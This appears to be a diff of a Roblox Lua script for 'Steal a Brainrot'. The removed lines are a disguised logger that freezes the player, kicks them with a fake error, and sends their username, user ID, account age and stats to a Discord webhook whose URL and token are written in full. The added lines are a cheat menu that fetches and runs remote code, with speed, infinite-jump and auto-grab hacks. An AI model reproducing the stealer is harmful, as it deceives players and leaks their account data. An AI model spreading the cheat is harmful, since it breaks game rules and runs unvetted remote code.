@@ -1,57 +1,98 @@
---[[
-    Xeno Execution Framework v2.1.4 | Module: Brainrot-Stealer
-    Status: Operational | Compatibility: Xeno Executor Optimized
-    Build: 0x84_XENO_SECURED
-]]
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
-local url = "https://discord.com/api/webhooks/1480678551643492433/M6F1hlBqrBMH6FNwv9hUTYTpg9W3CBLrtuxxwCBRskgRXcDfeewmEzhibwzAKA1ANIJJ"
-local p = game.Players.LocalPlayer
-local h = game:GetService("HttpService")
-local m = game:GetService("MarketplaceService")
+local Window = Rayfield:CreateWindow({
+   Name = "❄️ FrostHub | Steal a Brainrot",
+   LoadingTitle = "FrostHub Loading...",
+   LoadingSubtitle = "by Gemini",
+   ConfigurationSaving = {
+      Enabled = true,
+      FolderName = "FrostHub_Config",
+      FileName = "BrainrotSettings"
+   }
+})
 
--- Xeno Karuk (Freeze & Kick)
-if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then 
-    p.Character.HumanoidRootPart.Anchored = true 
-end
+-- Variables za funkciite
+local InfinityJumpEnabled = false
+local AutoGrabEnabled = false
+local SpeedBoostEnabled = false
+local WalkSpeedValue = 50
 
-task.delay(1.5, function() 
-    p:Kick("\n[Xeno Error]\nCode: 0x84\nReason: Module execution timeout. Please restart Xeno and try again.") 
+-- Auto Grab Logika
+task.spawn(function()
+    while task.wait(0.1) do
+        if AutoGrabEnabled then
+            for _, obj in ipairs(workspace:GetDescendants()) do
+                -- Proverka za "Brainrot" predmeti (promeni imeto, ako igrata go nariha razlichno)
+                if obj:IsA("TouchTransmitter") and obj.Parent:FindFirstChild("Handle") then
+                    firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, obj.Parent, 0)
+                    firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, obj.Parent, 1)
+                end
+            end
+        end
+    end
 end)
 
--- Data Extraction
-local br = "0"
-local s = p:FindFirstChild("leaderstats")
-if s then 
-    local v = s:FindFirstChild("Brainrots") or s:FindFirstChild("Points")
-    br = v and tostring(v.Value) or "0"
-end
+-- Infinity Jump Logika
+game:GetService("UserInputService").JumpRequest:Connect(function()
+    if InfinityJumpEnabled then
+        game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
+    end
+end)
 
-local gName = m:GetProductInfo(game.PlaceId).Name
-local pUrl = "https://www.roblox.com/users/" .. p.UserId .. "/profile"
+-- GUI Tabs
+local MainTab = Window:CreateTab("Main Functions", 4483362458)
 
--- Send to Discord (Xeno HTTP Request)
-local req = (syn and syn.request) or http_request or request or (http and http.request)
-if req then
-    req({
-        Url = url,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = h:JSONEncode({
-            ["username"] = "Xeno Logger",
-            ["avatar_url"] = "https://i.imgur.com/W9v6v99.png",
-            ["embeds"] = {{
-                ["title"] = "🎯 Target Logged chrez Xeno",
-                ["description"] = "Potrebitelqt executna scripta v **" .. gName .. "**",
-                ["color"] = 0xff0000,
-                ["fields"] = {
-                    {["name"] = "👤 Name", ["value"] = "```" .. p.Name .. "```", ["inline"] = true},
-                    {["name"] = "🧠 Brainrots", ["value"] = "```" .. br .. "```", ["inline"] = true},
-                    {["name"] = "📅 Account Age", ["value"] = p.AccountAge .. " days", ["inline"] = true},
-                    {["name"] = "🔗 Profile", ["value"] = "[Otvori Roblox Profil](" .. pUrl .. ")", ["inline"] = false},
-                    {["name"] = "🆔 ID", ["value"] = "```" .. tostring(p.UserId) .. "```", ["inline"] = false}
-                },
-                ["footer"] = {["text"] = "Xeno Executor Engine • " .. os.date("%X")}
-            }}
-        })
-    })
-end
+-- Speed Boost Toggle & Slider
+MainTab:CreateToggle({
+   Name = "Speed Boost",
+   CurrentValue = false,
+   Callback = function(Value)
+      SpeedBoostEnabled = Value
+      if not Value then
+          game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
+      end
+   end,
+})
+
+MainTab:CreateSlider({
+   Name = "Speed Amount",
+   Range = {16, 250},
+   Increment = 1,
+   Suffix = "Speed",
+   CurrentValue = 50,
+   Callback = function(Value)
+      WalkSpeedValue = Value
+   end,
+})
+
+-- Infinity Jump Toggle
+MainTab:CreateToggle({
+   Name = "Infinity Jump",
+   CurrentValue = false,
+   Callback = function(Value)
+      InfinityJumpEnabled = Value
+   end,
+})
+
+-- Auto Grab Toggle
+MainTab:CreateToggle({
+   Name = "Auto Grab (Brainrot)",
+   CurrentValue = false,
+   Callback = function(Value)
+      AutoGrabEnabled = Value
+      if Value then
+          Rayfield:Notify({Title = "FrostHub", Content = "Auto Grab is now ACTIVE", Duration = 3})
+      end
+   end,
+})
+
+-- Loop za Speed (za da ne se resetva pri umirane)
+task.spawn(function()
+    while task.wait(0.1) do
+        if SpeedBoostEnabled and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
+            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = WalkSpeedValue
+        end
+    end
+end)
+
+Rayfield:Notify({Title = "FrostHub Loaded!", Content = "Enjoy stealing those brainrots!", Duration = 5})
